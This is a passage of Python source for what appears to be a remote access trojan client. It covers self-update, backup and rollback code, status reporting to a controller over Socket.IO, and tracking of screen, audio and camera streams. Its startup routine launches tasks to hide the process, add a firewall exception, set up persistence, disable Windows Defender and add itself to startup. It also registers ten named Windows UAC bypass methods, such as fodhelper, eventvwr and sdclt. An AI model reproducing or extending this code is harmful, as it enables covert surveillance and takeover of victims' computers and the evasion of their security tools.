                    'socket_connected': sio.connected if 'sio' in globals() else False,
                    'webrtc_active': webrtc_connections if 'webrtc_connections' in globals() else {}
                },
                'active_streams': {
                    'screen': screen_streaming_active if 'screen_streaming_active' in globals() else False,
                    'audio': audio_streaming_active if 'audio_streaming_active' in globals() else False,
                    'camera': camera_streaming_active if 'camera_streaming_active' in globals() else False
                }
            }
            
            state_file = os.path.join(tempfile.gettempdir(), f'agent_state_{get_or_create_agent_id()}.json')
            import json
            with open(state_file, 'w') as f:
                json.dump(state_data, f)
            
            log_message(f"[SAVE] Agent state saved to {state_file}")
            
        except Exception as e:
            log_message(f"[ ! ] Failed to save agent state: {e}", "warning")
    
    def verify_restart_success(self) -> Dict[str, Any]:
        """Verify that the restart was successful"""
        try:
            # Look for verification files from previous restarts
            import glob
            verification_pattern = os.path.join(tempfile.gettempdir(), 'agent_restart_*.json')
            verification_files = glob.glob(verification_pattern)
            
            if not verification_files:
                return {
                    'success': True,
                    'message': 'No previous restart verification data found',
                    'is_fresh_start': True
                }
            
            # Use the most recent verification file
            latest_file = max(verification_files, key=os.path.getmtime)
            
            with open(latest_file, 'r') as f:
                verification_data = json.load(f)
            
            # Check if restart was recent (within verification timeout)
            restart_age = time.time() - verification_data.get('restart_time', 0)
            if restart_age > self.verification_timeout:
                return {
                    'success': False,
                    'message': 'Previous restart verification data is too old',
                    'restart_age': restart_age
                }
            
            # Verify version consistency
            if verification_data.get('version') != VERSION:
                return {
                    'success': False,
                    'message': 'Version mismatch after restart',
                    'expected_version': verification_data.get('version'),
                    'actual_version': VERSION
                }
            
            # Clean up verification file
            try:
                os.remove(latest_file)
            except Exception:
                pass
            
            return {
                'success': True,
                'message': 'Restart verification successful',
                'restart_reason': verification_data.get('restart_reason'),
                'restart_time': verification_data.get('restart_time'),
                'agent_id': verification_data.get('agent_id')
            }
            
        except Exception as e:
            return {
                'success': False,
                'message': f'Verification error: {str(e)}'
            }

# Global restart manager instance
restart_manager = RestartManager()

# --- Rollback and State Preservation System ---
class RollbackManager:
    """Manages rollback capabilities and state preservation during updates"""
    
    def __init__(self):
        self.backup_dir = os.path.join(tempfile.gettempdir(), 'agent_backups')
        self.max_backups = 5
        self.backup_lock = threading.Lock()
        self.state_preservation = StatePreserver()
        
        # Ensure backup directory exists
        try:
            os.makedirs(self.backup_dir, exist_ok=True)
        except Exception as e:
            log_message(f"[ ! ] Failed to create backup directory: {e}", "warning")
    
    def update_agent_id(self, agent_id: str):
        """Update the agent ID for state preservation"""
        self.state_preservation.update_agent_id(agent_id)
    
    def create_backup(self, files_to_backup: List[str] = None) -> Dict[str, Any]:
        """Create a backup of current agent files"""
        with self.backup_lock:
            try:
                backup_id = f"backup_{int(time.time())}_{os.getpid()}"
                backup_path = os.path.join(self.backup_dir, backup_id)
                
                # Log backup creation start
                update_logger.log_update_activity('backup_creation_started', {
                    'message': f'Starting backup creation: {backup_id}',
                    'backup_id': backup_id,
                    'files_to_backup': files_to_backup or [__file__]
                })
                
                # Update status
                update_status_reporter.update_status('backup_creation_started', {
                    'backup_id': backup_id,
                    'timestamp': time.time()
                })
                
                # Default files to backup
                if files_to_backup is None:
                    files_to_backup = [__file__]
                
                # Create backup directory
                os.makedirs(backup_path, exist_ok=True)
                
                backup_info = {
                    'backup_id': backup_id,
                    'timestamp': time.time(),
                    'agent_id': get_or_create_agent_id(),
                    'version': VERSION,
                    'files': {},
                    'state': self.state_preservation.capture_state()
                }
                
                # Backup each file
                for file_path in files_to_backup:
                    if os.path.exists(file_path):
                        try:
                            # Calculate relative path for backup
                            rel_path = os.path.basename(file_path)
                            backup_file_path = os.path.join(backup_path, rel_path)
                            
                            # Copy file
                            import shutil
                            shutil.copy2(file_path, backup_file_path)
                            
                            # Store file info
                            backup_info['files'][rel_path] = {
                                'original_path': file_path,
                                'backup_path': backup_file_path,
                                'size': os.path.getsize(file_path),
                                'mtime': os.path.getmtime(file_path),
                                'hash': self._calculate_file_hash(file_path)
                            }
                            
                            log_message(f"[SAVE] Backed up: {file_path} -> {backup_file_path}")
                            
                        except Exception as e:
                            log_message(f"[ ! ] Failed to backup {file_path}: {e}", "warning")
                
                # Save backup metadata
                metadata_file = os.path.join(backup_path, 'backup_metadata.json')
                import json
                with open(metadata_file, 'w') as f:
                    json.dump(backup_info, f, indent=2)
                
                log_message(f"[ OK ] Backup created successfully: {backup_id}")
                
                # Log backup completion
                update_logger.log_update_activity('backup_created', {
                    'message': f'Backup created successfully: {backup_id}',
                    'backup_id': backup_id,
                    'files_backed_up': len(backup_info['files']),
                    'backup_path': backup_path
                })
                
                # Update status
                update_status_reporter.update_status('backup_created', {
                    'backup_id': backup_id,
                    'files_backed_up': len(backup_info['files']),
                    'timestamp': time.time()
                })
                
                # Cleanup old backups
                self._cleanup_old_backups()
                
                return {
                    'success': True,
                    'backup_id': backup_id,
                    'backup_path': backup_path,
                    'files_backed_up': len(backup_info['files'])
                }
                
            except Exception as e:
                log_message(f"[ X ] Backup creation failed: {e}", "error")
                
                # Log backup creation failure
                update_logger.log_update_activity('backup_creation_failed', {
                    'message': f'Backup creation failed: {e}',
                    'error': str(e)
                }, level='error')
                
                # Update status
                update_status_reporter.update_status('backup_creation_failed', {
                    'error': str(e),
                    'timestamp': time.time()
                })
                
                return {
                    'success': False,
                    'error': str(e)
                }
    
    def rollback_to_backup(self, backup_id: str) -> Dict[str, Any]:
        """Rollback to a specific backup"""
        with self.backup_lock:
            try:
                backup_path = os.path.join(self.backup_dir, backup_id)
                metadata_file = os.path.join(backup_path, 'backup_metadata.json')
                
                if not os.path.exists(metadata_file):
                    # Log rollback failure
                    update_logger.log_update_activity('rollback_failed', {
                        'message': f'Backup metadata not found for rollback: {backup_id}',
                        'backup_id': backup_id,
                        'error': 'Backup metadata not found'
                    }, level='error')
                    
                    # Update status
                    update_status_reporter.update_status('rollback_failed', {
                        'backup_id': backup_id,
                        'error': 'Backup metadata not found',
                        'timestamp': time.time()
                    })
                    
                    return {
                        'success': False,
                        'error': f'Backup metadata not found: {backup_id}'
                    }
                
                # Load backup metadata
                import json
                with open(metadata_file, 'r') as f:
                    backup_info = json.load(f)
                
                log_message(f"[ RESTARTING ] Starting rollback to backup: {backup_id}")
                
                # Log rollback start
                update_logger.log_update_activity('rollback_started', {
                    'message': f'Starting rollback to backup: {backup_id}',
                    'backup_id': backup_id,
                    'backup_timestamp': backup_info.get('timestamp'),
                    'backup_version': backup_info.get('version')
                })
                
                # Update status
                update_status_reporter.update_status('rollback_started', {
                    'backup_id': backup_id,
                    'backup_timestamp': backup_info.get('timestamp'),
                    'backup_version': backup_info.get('version'),
                    'timestamp': time.time()
                })
                
                rollback_results = {
                    'success': True,
                    'files_restored': 0,
                    'files_failed': 0,
                    'errors': []
                }
                
                # Restore each file
                for rel_path, file_info in backup_info.get('files', {}).items():
                    try:
                        backup_file_path = file_info['backup_path']
                        original_path = file_info['original_path']
                        
                        if os.path.exists(backup_file_path):
                            # Create backup of current file before rollback
                            if os.path.exists(original_path):
                                temp_backup = original_path + '.rollback_temp'
                                import shutil
                                shutil.copy2(original_path, temp_backup)
                            
                            # Restore from backup
                            shutil.copy2(backup_file_path, original_path)
                            
                            # Verify restoration
                            restored_hash = self._calculate_file_hash(original_path)
                            if restored_hash == file_info['hash']:
                                rollback_results['files_restored'] += 1
                                log_message(f"[ OK ] Restored: {original_path}")
                            else:
                                rollback_results['files_failed'] += 1
                                rollback_results['errors'].append(f"Hash mismatch for {original_path}")
                                log_message(f"[ ! ] Hash mismatch after restoring: {original_path}")
                        else:
                            rollback_results['files_failed'] += 1
                            rollback_results['errors'].append(f"Backup file not found: {backup_file_path}")
                            
                    except Exception as e:
                        rollback_results['files_failed'] += 1
                        rollback_results['errors'].append(f"Failed to restore {rel_path}: {str(e)}")
                        log_message(f"[ X ] Failed to restore {rel_path}: {e}", "error")
                
                # Restore state if available
                if 'state' in backup_info:
                    self.state_preservation.restore_state(backup_info['state'])
                
                # Set overall success
                rollback_results['success'] = rollback_results['files_failed'] == 0
                
                if rollback_results['success']:
                    log_message(f"[ OK ] Rollback completed successfully: {backup_id}")
                    
                    # Log successful rollback
                    update_logger.log_update_activity('rollback_completed', {
                        'message': f'Rollback completed successfully: {backup_id}',
                        'backup_id': backup_id,
                        'files_restored': rollback_results['files_restored'],
                        'files_failed': rollback_results['files_failed']
                    })
                    
                    # Update status
                    update_status_reporter.update_status('rollback_completed', {
                        'backup_id': backup_id,
                        'files_restored': rollback_results['files_restored'],
                        'files_failed': rollback_results['files_failed'],
                        'timestamp': time.time()
                    })
                else:
                    log_message(f"[ ! ] Rollback completed with errors: {backup_id}")
                    
                    # Log rollback with errors
                    update_logger.log_update_activity('rollback_completed_with_errors', {
                        'message': f'Rollback completed with errors: {backup_id}',
                        'backup_id': backup_id,
                        'files_restored': rollback_results['files_restored'],
                        'files_failed': rollback_results['files_failed'],
                        'errors': rollback_results['errors']
                    }, level='warning')
                    
                    # Update status
                    update_status_reporter.update_status('rollback_completed_with_errors', {
                        'backup_id': backup_id,
                        'files_restored': rollback_results['files_restored'],
                        'files_failed': rollback_results['files_failed'],
                        'errors': rollback_results['errors'],
                        'timestamp': time.time()
                    })
                
                return rollback_results
                
            except Exception as e:
                log_message(f"[ X ] Rollback failed: {e}", "error")
                
                # Log rollback failure
                update_logger.log_update_activity('rollback_failed', {
                    'message': f'Rollback to backup {backup_id} failed: {e}',
                    'backup_id': backup_id,
                    'error': str(e)
                }, level='error')
                
                # Update status
                update_status_reporter.update_status('rollback_failed', {
                    'backup_id': backup_id,
                    'error': str(e),
                    'timestamp': time.time()
                })
                
                return {
                    'success': False,
                    'error': str(e)
                }
    
    def get_available_backups(self) -> List[Dict[str, Any]]:
        """Get list of available backups"""
        try:
            backups = []
            
            for backup_id in os.listdir(self.backup_dir):
                backup_path = os.path.join(self.backup_dir, backup_id)
                metadata_file = os.path.join(backup_path, 'backup_metadata.json')
                
                if os.path.exists(metadata_file):
                    try:
                        import json
                        with open(metadata_file, 'r') as f:
                            metadata = json.load(f)
                        
                        backups.append({
                            'backup_id': backup_id,
                            'timestamp': metadata.get('timestamp', 0),
                            'agent_id': metadata.get('agent_id', 'unknown'),
                            'version': metadata.get('version', 'unknown'),
                            'file_count': len(metadata.get('files', {}))
                        })
                    except Exception as e:
                        log_message(f"[ ! ] Failed to read backup metadata {backup_id}: {e}", "warning")
            
            # Sort by timestamp (newest first)
            backups.sort(key=lambda x: x['timestamp'], reverse=True)
            return backups
            
        except Exception as e:
            log_message(f"[ ! ] Failed to get available backups: {e}", "warning")
            return []
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA256 hash of a file"""
        try:
            import hashlib
            with open(file_path, 'rb') as f:
                return hashlib.sha256(f.read()).hexdigest()
        except Exception as e:
            log_message(f"[ ! ] Failed to calculate hash for {file_path}: {e}", "warning")
            return ""
    
    def _cleanup_old_backups(self):
        """Remove old backups beyond the maximum limit"""
        try:
            backups = self.get_available_backups()
            
            if len(backups) > self.max_backups:
                # Sort by timestamp (oldest first)
                backups.sort(key=lambda x: x['timestamp'])
                
                # Remove oldest backups
                to_remove = backups[:-self.max_backups]
                for backup in to_remove:
                    try:
                        backup_path = os.path.join(self.backup_dir, backup['backup_id'])
                        import shutil
                        shutil.rmtree(backup_path)
                        log_message(f"[DEL] Removed old backup: {backup['backup_id']}")
                    except Exception as e:
                        log_message(f"[ ! ] Failed to remove backup {backup['backup_id']}: {e}", "warning")
                        
        except Exception as e:
            log_message(f"[ ! ] Failed to cleanup old backups: {e}", "warning")

class StatePreserver:
    """Manages state preservation during updates"""
    
    def __init__(self):
        # Use a temporary agent ID that will be updated when actual agent starts
        self.agent_id = "pending"
        self.state_file = os.path.join(tempfile.gettempdir(), f'agent_state_{self.agent_id}.json')
    
    def update_agent_id(self, agent_id: str):
        """Update the agent ID and state file path"""
        self.agent_id = agent_id
        self.state_file = os.path.join(tempfile.gettempdir(), f'agent_state_{self.agent_id}.json')
    
    def capture_state(self) -> Dict[str, Any]:
        """Capture current agent state"""
        try:
            state = {
                'timestamp': time.time(),
                'agent_id': self.agent_id,
                'version': VERSION,
                'connections': {},
                'active_operations': {},
                'configuration': {}
            }
            
            # Capture connection state
            if 'sio' in globals() and sio.connected:
                state['connections']['socket'] = {
                    'connected': True,
                    'connected_at': getattr(sio, 'connected_at', time.time())
                }
            
            # Capture streaming state
            state['active_operations']['streaming'] = {
                'screen': screen_streaming_active if 'screen_streaming_active' in globals() else False,
                'audio': audio_streaming_active if 'audio_streaming_active' in globals() else False,
                'camera': camera_streaming_active if 'camera_streaming_active' in globals() else False
            }
            
            # Capture configuration
            if 'agent_config' in globals():
                state['configuration'] = agent_config.copy()
            
            return state
            
        except Exception as e:
            log_message(f"[ ! ] Failed to capture state: {e}", "warning")
            return {}
    
    def restore_state(self, state: Dict[str, Any]):
        """Restore agent state"""
        try:
            log_message("[ RESTARTING ] Restoring agent state...")
            
            # Restore configuration
            if 'configuration' in state and state['configuration']:
                if 'agent_config' in globals():
                    agent_config.update(state['configuration'])
                    log_message("[ OK ] Configuration restored")
            
            # Restore streaming operations
            if 'active_operations' in state and 'streaming' in state['active_operations']:
                streaming_state = state['active_operations']['streaming']
                
                # Restart streams that were active
                if streaming_state.get('screen'):
                    log_message("[ RESTARTING ] Restarting screen stream...")
                    # Screen stream restart logic would go here
                
                if streaming_state.get('audio'):
                    log_message("[ RESTARTING ] Restarting audio stream...")
                    # Audio stream restart logic would go here
                
                if streaming_state.get('camera'):
                    log_message("[ RESTARTING ] Restarting camera stream...")
                    # Camera stream restart logic would go here
            
            log_message("[ OK ] Agent state restoration completed")
            
        except Exception as e:
            log_message(f"[ ! ] Failed to restore state: {e}", "warning")

# Global rollback manager instance
rollback_manager = RollbackManager()

# --- Comprehensive Logging and Status Reporting System ---
class UpdateLogger:
    """Comprehensive logging system for update activities"""
    
    def __init__(self):
        # Use a temporary agent ID that will be updated when actual agent starts
        self.agent_id = "pending"
        self.log_file = os.path.join(tempfile.gettempdir(), f'agent_update_log_{self.agent_id}.json')
        self.log_entries = []
        self.log_lock = threading.Lock()
        self.max_entries = 1000
    
    def update_agent_id(self, agent_id: str):
        """Update the agent ID and log file path"""
        with self.log_lock:
            self.agent_id = agent_id
            self.log_file = os.path.join(tempfile.gettempdir(), f'agent_update_log_{self.agent_id}.json')
        
        # Ensure log file exists
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r') as f:
                    self.log_entries = json.load(f)
                    # Keep only recent entries
                    if len(self.log_entries) > self.max_entries:
                        self.log_entries = self.log_entries[-self.max_entries:]
        except Exception:
            self.log_entries = []
    
    def log_update_activity(self, activity_type: str, details: Dict[str, Any], level: str = 'info'):
        """Log an update activity"""
        with self.log_lock:
            entry = {
                'timestamp': time.time(),
                'agent_id': get_or_create_agent_id(),
                'version': VERSION,
                'activity_type': activity_type,
                'level': level,
                'details': details,
                'pid': os.getpid()
            }
            
            self.log_entries.append(entry)
            
            # Keep log size manageable
            if len(self.log_entries) > self.max_entries:
                self.log_entries = self.log_entries[-self.max_entries:]
            
            # Save to file
            try:
                with open(self.log_file, 'w') as f:
                    json.dump(self.log_entries, f, indent=2)
            except Exception as e:
                log_message(f"[ ! ] Failed to save update log: {e}", "warning")
            
            # Also log to main log
            log_message(f"[DATA] Update Activity: {activity_type} - {details.get('message', 'No message')}", level)
    
    def get_update_history(self, limit: int = 100, activity_type: str = None) -> List[Dict[str, Any]]:
        """Get update history"""
        with self.log_lock:
            entries = self.log_entries.copy()
        
        # Filter by activity type if specified
        if activity_type:
            entries = [entry for entry in entries if entry['activity_type'] == activity_type]
        
        # Sort by timestamp (newest first)
        entries.sort(key=lambda x: x['timestamp'], reverse=True)
        
        return entries[:limit]
    
    def get_update_statistics(self) -> Dict[str, Any]:
        """Get update statistics"""
        with self.log_lock:
            entries = self.log_entries.copy()
        
        if not entries:
            return {
                'total_updates': 0,
                'successful_updates': 0,
                'failed_updates': 0,
                'rollback_count': 0,
                'success_rate': 0.0
            }
        
        # Count different activity types
        update_attempts = len([e for e in entries if e['activity_type'] == 'update_attempt'])
        successful_updates = len([e for e in entries if e['activity_type'] == 'update_success'])
        failed_updates = len([e for e in entries if e['activity_type'] == 'update_failed'])
        rollbacks = len([e for e in entries if e['activity_type'] == 'rollback'])
        
        # Calculate success rate
        success_rate = (successful_updates / update_attempts * 100) if update_attempts > 0 else 0.0
        
        return {
            'total_updates': update_attempts,
            'successful_updates': successful_updates,
            'failed_updates': failed_updates,
            'rollback_count': rollbacks,
            'success_rate': round(success_rate, 2),
            'last_update': max(entries, key=lambda x: x['timestamp'])['timestamp'] if entries else 0
        }

class UpdateStatusReporter:
    """Real-time status reporting for update operations"""
    
    def __init__(self):
        self.current_status = {}
        self.status_lock = threading.Lock()
        self.status_callbacks = []
    
    def update_status(self, status_type: str, status_data: Dict[str, Any]):
        """Update current status"""
        with self.status_lock:
            self.current_status[status_type] = {
                'timestamp': time.time(),
                'data': status_data
            }
            
            # Notify callbacks
            for callback in self.status_callbacks:
                try:
                    callback(status_type, status_data)
                except Exception as e:
                    log_message(f"[ ! ] Status callback error: {e}", "warning")
            
            # Emit status update via Socket.IO if connected
            self._emit_status_update(status_type, status_data)
    
    def get_current_status(self) -> Dict[str, Any]:
        """Get current status"""
        with self.status_lock:
            return self.current_status.copy()
    
    def add_status_callback(self, callback):
        """Add a status callback"""
        with self.status_lock:
            self.status_callbacks.append(callback)
    
    def remove_status_callback(self, callback):
        """Remove a status callback"""
        with self.status_lock:
            if callback in self.status_callbacks:
                self.status_callbacks.remove(callback)
    
    def _emit_status_update(self, status_type: str, status_data: Dict[str, Any]):
        """Emit status update via Socket.IO"""
        try:
            if 'sio' in globals() and sio.connected:
                status_payload = {
                    'type': status_type,
                    'data': status_data,
                    'timestamp': time.time(),
                    'agent_id': get_or_create_agent_id()
                }
                
                sio.emit('update_status', status_payload)
                log_message(f"[NET] Status update emitted: {status_type}")
                
        except Exception as e:
            log_message(f"[ ! ] Failed to emit status update: {e}", "warning")

# Global logging and status reporting instances
update_logger = UpdateLogger()
update_status_reporter = UpdateStatusReporter()

# --- Background Initialization System ---
class BackgroundInitializer:
    """Handles background initialization of time-consuming tasks."""
    
    def __init__(self):
        self.initialization_threads = []
        self.initialization_complete = threading.Event()
        self.initialization_results = {}
        self.initialization_lock = threading.Lock()
    
    def start_background_initialization(self, quick_startup=False):
        """Start all background initialization tasks."""
        log_message("Starting background initialization...")
        
        # Define tasks based on startup mode
        if quick_startup:
            # Quick startup: skip some time-consuming tasks
            tasks = [
                ("privilege_escalation", self._init_privilege_escalation),
                ("components", self._init_components)
            ]
            log_message("Quick startup mode: skipping some initialization tasks")
        else:
            # Full startup: all tasks
            tasks = [
                ("privilege_escalation", self._init_privilege_escalation),
                ("stealth_features", self._init_stealth_features),
                ("persistence_setup", self._init_persistence_setup),
                ("defender_disable", self._init_defender_disable),
                ("startup_config", self._init_startup_config),
                ("components", self._init_components)
            ]
        
        for task_name, task_func in tasks:
            thread = threading.Thread(
                target=self._run_initialization_task,
                args=(task_name, task_func),
                daemon=True
            )
            thread.start()
            self.initialization_threads.append(thread)
        
        # Start a monitor thread to track completion
        monitor_thread = threading.Thread(target=self._monitor_initialization, daemon=True)
        monitor_thread.start()
        
        # Start a progress indicator thread
        progress_thread = threading.Thread(target=self._show_progress, daemon=True)
        progress_thread.start()
    
    def _show_progress(self):
        """Show initialization progress in real-time."""
        dots = 0
        while not self.initialization_complete.is_set():
            status = self.get_initialization_status()
            completed = len([r for r in status.values() if r])
            total = len(self.initialization_threads)  # Dynamic total based on actual tasks
            
            if total > 0:
                progress_bar = "=" * completed + "-" * (total - completed)
                dots = (dots + 1) % 4
                dot_str = "." * dots
                
                log_message(f"Initialization progress: [{progress_bar}] {completed}/{total} tasks complete{dot_str}")
            time.sleep(0.5)
        
        if total > 0:
            log_message(f"Initialization complete! All {total} tasks finished.")
    
    def _run_initialization_task(self, task_name, task_func):
        """Run a single initialization task and store results."""
        try:
            # Add timeout to prevent hanging
            import threading
            import queue
            
            result_queue = queue.Queue()
            exception_queue = queue.Queue()
            
            def task_wrapper():
                try:
                    result = task_func()
                    result_queue.put(result)
                except Exception as e:
                    exception_queue.put(e)
            
            task_thread = threading.Thread(target=task_wrapper, daemon=True)
            task_thread.start()
            
            # Wait for task completion with timeout
            try:
                result = result_queue.get(timeout=30)  # 30 second timeout
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': True,
                        'result': result,
                        'error': None
                    }
            except queue.Empty:
                # Task timed out
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': False,
                        'result': None,
                        'error': 'Task timed out after 30 seconds'
                    }
            except Exception as e:
                # Exception occurred
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': False,
                        'result': None,
                        'error': str(e)
                    }
                    
        except Exception as e:
            with self.initialization_lock:
                self.initialization_results[task_name] = {
                    'success': False,
                    'result': None,
                    'error': str(e)
                }
    
    def _monitor_initialization(self):
        """Monitor initialization progress and set completion event."""
        try:
            while len(self.initialization_threads) > 0:
                # Check if all threads are done
                active_threads = [t for t in self.initialization_threads if t.is_alive()]
                if len(active_threads) == 0:
                    break
                time.sleep(0.1)
            
            # All initialization tasks complete
            self.initialization_complete.set()
            log_message("Background initialization complete")
        except Exception as e:
            log_message(f"Error in initialization monitor: {e}", "error")
            self.initialization_complete.set()  # Ensure completion event is set even on error
    
    def _init_privilege_escalation(self):
        """Initialize privilege escalation - ETHICAL MODE with proper permission request."""
        try:
            debug_print("=" * 80)
            debug_print("[PRIVILEGE ESCALATION] Starting privilege escalation...")
            debug_print("=" * 80)
            
            if WINDOWS_AVAILABLE:
                debug_print("[PRIVILEGE ESCALATION] Windows detected - checking admin status...")
                if is_admin():
                    log_message("Already running as admin (no elevation actions taken)")
                    return "already_admin"
                log_message("Running as standard user (elevation disabled)")
                return "standard_user"

            return "no_elevation_needed"
        except Exception as e:
            debug_print(f"[ X ] [PRIVILEGE ESCALATION] EXCEPTION: {e}")
            import traceback
            traceback.print_exc()
            return f"privilege_escalation_error: {e}"
    
    def _init_stealth_features(self):
        """Initialize stealth features in background."""
        try:
            hide_process()
            add_firewall_exception()
            return "stealth_initialized"
        except Exception as e:
            return f"stealth_failed: {e}"
    
    def _init_persistence_setup(self):
        """Setup persistence mechanisms in background."""
        try:
            if WINDOWS_AVAILABLE:
                # Use advanced persistence if available
                if is_admin():
                    setup_advanced_persistence()
                    return "advanced_persistence_setup_complete"
                else:
                    establish_persistence()
                    return "basic_persistence_setup_complete"
            else:
                establish_linux_persistence()
                return "linux_persistence_setup_complete"
        except Exception as e:
            return f"persistence_setup_failed: {e}"
    
    def _init_defender_disable(self):
        """Disable Windows Defender in background."""
        try:
            if WINDOWS_AVAILABLE:
                if DEFENDER_DISABLE_ENABLED:
                    disable_defender()
                    return "defender_disabled"
                else:
                    return "defender_disable_skipped"
            else:
                return "defender_disable_skipped_linux"
        except Exception as e:
            return f"defender_disable_failed: {e}"
    
    def _init_startup_config(self):
        """Configure startup in background."""
        try:
            add_to_startup()
            return "startup_configured"
        except Exception as e:
            return f"startup_config_failed: {e}"
    
    def _init_components(self):
        """Initialize core components in background."""
        try:
            initialize_components()
            return "components_initialized"
        except Exception as e:
            return f"components_init_failed: {e}"
    
    def get_initialization_status(self):
        """Get current initialization status."""
        try:
            with self.initialization_lock:
                return self.initialization_results.copy()
        except Exception as e:
            log_message(f"Error getting initialization status: {e}", "error")
            return {}
    
    def wait_for_completion(self, timeout=None):
        """Wait for initialization to complete."""
        try:
            if timeout is None:
                self.initialization_complete.wait()
            else:
                self.initialization_complete.wait(timeout=timeout)
            return self.initialization_complete.is_set()
        except Exception as e:
            log_message(f"Error waiting for initialization completion: {e}", "error")
            return False

# Global background initializer (lazy-initialized to avoid RLock before eventlet patch)
background_initializer = None

def get_background_initializer():
    """Get or create the background initializer instance (lazy initialization)"""
    global background_initializer
    if background_initializer is None:
        background_initializer = BackgroundInitializer()
    return background_initializer

# --- Input Controllers ---
mouse_controller = None
keyboard_controller = None

# --- High-Performance Components ---
high_performance_capture = None
low_latency_input = None
LOW_LATENCY_INPUT_HANDLER = None  # Keep both for compatibility

# --- Privilege Escalation Functions ---

# ADVANCED UAC BYPASS CLASSES (from client-chop-version)
class UACBypassError(Exception):
    """Custom exception for UAC bypass errors"""
    pass

class UACBypassMethod:
    """Base class for UAC bypass methods with enhanced error handling"""
    
    def __init__(self, name: str, description: str, method_id: int):
        self.name = name
        self.description = description
        self.method_id = method_id
        self._lock = threading.Lock()
    
    def execute(self) -> bool:
        """Execute the UAC bypass method with enhanced error handling"""
        emit_bypass_test_debug(self.method_id, self.name, action='start', status='pending', point='execute.enter')
        try:
            if should_skip_uac_method(self.method_id, self.name):
                log_message(f"[UAC BYPASS] Skipping method: {self.name}", "warning")
                emit_bypass_test_debug(self.method_id, self.name, action='skip', status='skipped', reason='precheck_skip', point='execute.precheck')
                return False
        except Exception:
            pass
        debug_print(f"  [METHOD] Checking if {self.name} is available...")
        
        if not self.is_available():
            debug_print(f"  [ X ] [METHOD] {self.name} NOT AVAILABLE on this system")
            emit_bypass_test_debug(self.method_id, self.name, action='availability', status='skipped', reason='not_available', point='execute.availability')
            raise UACBypassError(f"{self.name} not available on this system")
        
        debug_print(f"  [ OK ] [METHOD] {self.name} is AVAILABLE")
        if UAC_BYPASS_DEBUG_MODE:
            log_message(f"[UAC BYPASS DEBUG] {self.name} starting in full debug mode", "warning")
        
        with self._lock:
            try:
                debug_print(f"  [METHOD] Executing {self.name} (ID: {self.method_id})...")
                log_message(f"[UAC BYPASS] Attempting method: {self.name} (ID: {self.method_id})", "info")
                
                result = self._execute_bypass()
                
                if result:
                    debug_print(f"  [ OK ][ OK ][ OK ] [METHOD] {self.name} SUCCESS!")
                    log_message(f"[ OK ] [UAC BYPASS] SUCCESS! Method {self.name} worked!", "success")
                    emit_bypass_test_debug(self.method_id, self.name, action='result', status='success', point='execute.result')
                else:
                    debug_print(f"  [ X ] [METHOD] {self.name} returned False")
                    log_message(f"[UAC BYPASS] Method {self.name} returned False", "warning")
                    emit_bypass_test_debug(self.method_id, self.name, action='result', status='failed', point='execute.result')
                
                return result
                
            except Exception as e:
                debug_print(f"  [ X ] [METHOD] {self.name} EXCEPTION: {e}")
                log_message(f"[UAC BYPASS] Method {self.name} failed: {e}", "error")
                try:
                    if maybe_enable_bypass_debugging():
                        log_message(f"[UAC BYPASS DEBUG] Defender detection active; debug mode enabled for {self.name}", "warning")
                except Exception:
                    pass
                emit_bypass_test_debug(self.method_id, self.name, action='error', status='error', reason=str(e), point='execute.exception')
                raise UACBypassError(f"{self.name} failed: {e}")
    
    def _execute_bypass(self) -> bool:
        """Override this method in subclasses"""
        raise NotImplementedError("Subclasses must implement _execute_bypass")
    
    def is_available(self) -> bool:
        """Check if this method is available on the current system"""
        return WINDOWS_AVAILABLE
    
    def get_current_executable(self) -> str:
        """Get the current executable path for elevation"""
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            return f'python.exe "{current_exe}"'
        return current_exe
    
    def cleanup_registry(self, key_path: str, hive=None) -> None:
        """Clean up registry entries with proper error handling"""
        if UAC_BYPASS_DEBUG_MODE:
            log_message(f"[UAC BYPASS DEBUG] Skipping registry cleanup for {key_path}", "warning")
            return
        try:
            import winreg
            if hive is None:
                hive = winreg.HKEY_CURRENT_USER
            
            winreg.DeleteKey(hive, key_path)
            log_message(f"[CLEANUP] Registry key cleaned: {key_path}", "debug")
        except Exception as e:
            log_message(f"[CLEANUP] Registry cleanup failed for {key_path}: {e}", "debug")

class UACBypassManager:
    """ADVANCED UAC bypass manager with professional architecture"""
    
    def __init__(self):
        debug_print("[UAC MANAGER] Creating UACBypassManager instance...")
        debug_print("[UAC MANAGER] Creating RLock (should be patched by eventlet)...")
        self._lock = threading.RLock()
        debug_print("[ OK ] [UAC MANAGER] RLock created successfully")
        
        self.methods = {}
        debug_print("[UAC MANAGER] Calling _initialize_methods()...")
        self._initialize_methods()
        self.preferred_order = [
            'cleanmgr_sagerun',
            'wsreset',
            'eventvwr',
            'sdclt',
            'fodhelper',
            'computerdefaults',
            'silentcleanup',
            'icmluautil',
            'slui',
            'wsreset',
            'winsat'
        ]
        debug_print("[ OK ] [UAC MANAGER] UACBypassManager fully initialized")
    
    def _initialize_methods(self):
        """Initialize all UAC bypass methods"""
        debug_print("[UAC MANAGER] Registering bypass methods...")
        
        # Register all bypass methods
        method_list = [
            ('cleanmgr_sagerun', CleanmgrSagerunBypass()),
            ('fodhelper', FodhelperProtocolBypass()),
            ('computerdefaults', ComputerDefaultsBypass()),
            ('eventvwr', EventViewerBypass()),
            ('sdclt', SdcltBypass()),
            ('wsreset', WSResetBypass()),
            ('slui', SluiBypass()),
            ('winsat', WinsatBypass()),
            ('silentcleanup', SilentCleanupBypass()),
            ('icmluautil', ICMLuaUtilBypass()),
        ]
        
        for name, method in method_list:
            debug_print(f"  Registering method: {name}")
            self.methods[name] = method
        
        debug_print(f"[ OK ] [UAC MANAGER] Registered {len(self.methods)} UAC bypass methods")
        log_message(f"[UAC MANAGER] Initialized {len(self.methods)} UAC bypass methods", "info")
    
    def get_available_methods(self) -> list:
        """Get list of available UAC bypass methods"""
        with self._lock:
            available = [name for name, method in self.methods.items() if method.is_available() and UAC_BYPASS_METHODS_ENABLED.get(name, True)]
            try:
                order_map = {name: i for i, name in enumerate(self.preferred_order)}
                available.sort(key=lambda n: order_map.get(n, 1_000_000))
            except Exception:
                pass
            log_message(f"[UAC MANAGER] {len(available)}/{len(self.methods)} methods available", "info")
            return available
    
    def execute_method(self, method_name: str) -> bool:
        """Execute a specific UAC bypass method"""
